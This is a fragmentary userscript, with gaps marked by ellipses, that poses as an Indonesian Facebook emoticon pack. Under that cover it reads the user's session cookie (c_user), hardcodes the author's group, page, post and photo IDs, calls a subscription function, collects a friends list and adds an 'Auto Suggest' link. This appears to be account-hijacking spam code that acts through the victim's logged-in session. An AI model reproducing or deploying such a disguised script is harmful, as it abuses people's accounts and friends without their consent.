// ==UserScript==
// @name            Emoji New Emoticon Indonesia
// @description     Facebook AutoNew 2013 By RayeenSinger
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/RayeenSinger" target="_blank">Created By Rayeen Singer Developer<br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("293956750748600");

//Group ku Rayeen
var gid = ['482226241852615'];
...
var spage_id = "482226241852615";
var spost_id = "100001900642412_469961496410534";
var sfoto_id = "517450681661615";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Rayeen Singer';
